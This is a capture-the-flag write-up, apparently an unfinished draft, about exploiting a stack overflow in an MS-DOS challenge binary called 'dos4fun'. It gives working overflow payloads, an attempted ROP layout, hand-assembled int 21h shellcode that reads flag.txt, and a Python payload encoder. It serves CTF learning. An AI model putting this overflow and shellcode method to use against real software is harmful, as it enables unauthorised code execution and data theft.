# dos4fun

Okay. This one is really fucking hard and it took a lot of time to see the bug.

[Add part about loading symbols with idapython cause ida sucks at parsing dos symbols]

After some basic reversing, you can easily see that the first step is to enter `"capturetheflag"`. Easy.

Now, after a bit of fuzzing, I see that the input of the numbers 1 to 25 crashes the program.

After (not that) few hours of dos debugging, I found the problem: the file `"keys"` is opened to write in mode `"w"`, and when I write `'\n'` to it, its translated to `"\r\n"`. The file is then xored to death with `'\xff'` (after being opened as `"rb+"` - important!), destroying those `CRLF`s, which means the next time I open the file (for reading in `"r"`) mode, we dont get them squeezed into one neat `'\n'`.

When the file is read into the `0x32` bytes limited stack buffer, we get control of `ip`. Victory?

Not quite. Problem: I have no idea how to write `ms-dos` shellcode. Solution: read a fuck-ton of old-ass documentation.


## Attempt 1 - Test
Payload #1 (test): 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 2570 2570 64042

Calls the `printf("how did you get here...")`. Works. 

## Attempts 2 and 3 - Jump to stack shellcode
Payload #2 (faults): 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 2570 2570 127

Payload #3: 65351 17844 91 56822 1 1 1 1 1 1 1 1 1 1 1 1 1 1 37020 27522 37278 65435 2570 2570 127

```assembly
    mov ax, 4B00h (B8 00 4B) 
    mov dx, FFA4 (BA A4 FF)
    int 21h (CD 21)
```

Fails - `cs` fucks me.

## Attempt 4 - ROP

Problem: The overflow is not large enough.

Flow: `__open()` -> `__read()` -> `__write()`.

We have: `pop` 3 times gadget in `__fgetc()`

Stack layout:

* address of `__open()`
* address of of `pop`*2 gadget
* argument1 for `__open()` - `name`
* argument2 for `__open()` - `mode`
* address of `__read()`
* address of `pop`*3 gadget
* file_handle for `__read()`
* argument2 for `__read()`
* argument3 for `__read()`
* address of `__write()`
* nothing ?
* argument1 for `__write()`
* argument2 for `__write()`
* argument3 for `__write()`


## Attempt 5 - Jump to shellcode with real mode addressing
real address to jump to:
ds:0ae6 == 0xa826 == cs:0x3b86

file name - "flag.txt"

```assembly
    ; open the file
    ; ah - int (0x3d - open)
    ; al - mode (0 - read)
    ; dx - filename

    ; B8 00 3D
    ; BA 08 0b
    ; CD 21

    mov ax, 0x3d00
    mov dx, 0xb08
    int 0x21

    ; read from the file
    ; ah - int (0x3f - read)
    ; bx - handle
    ; cx - amount
    ; dx - buffer
    
    ; 89 C3
    ; B9 80 00
    ; BA 56 06
    ; B4 3F
    ; CD 21

    mov bx, ax
    mov cx, 0x80
    mov dx, 0x0656
    mov ah, 0x3f
    int 0x21

    ; write to output
    ; ah - int (0x40 - write)
    ; bx - handle
    ; cx - amount
    ; dx - buffer

    ; B4 40
    ; BB 02 00
    ; B9 80 00
    ; BA 56 06
    ; CD 21

    mov ah, 0x40
    mov bx, 2
    mov cx, 0x80
    mov dx, 0x0656
    int 0x21

    ; total length: 33 bytes
```

```python
import struct

shellcode = b"\xb8\x00\x3d\xba\x08\x0b\xcd\x21\x89\xc3\xb9\x80\x00\xba\x56\x06\xb4\x3f\xcd\x21\xb4\x40\xbb\x02\x00\xb9\x80\x00\xba\x56\x06\xcd\x21"
flag_file = b"flag\x00"

def encode(b):
    chunks = [b[i:i+2].ljust(2, b'\x00') for i in range(0, len(b), 2)]
    return [0xffff ^ struct.unpack('<H', c)[0] for c in chunks]

payload = (encode(shellcode) + encode(flag_file))
print(len(payload))
payload.extend(1 for _ in range(22 - len(payload)))
payload.extend([0x0a0a, 0x0a0a] + encode(b'\x86\x3b'))
assert len(payload) == 25
```

Victory!
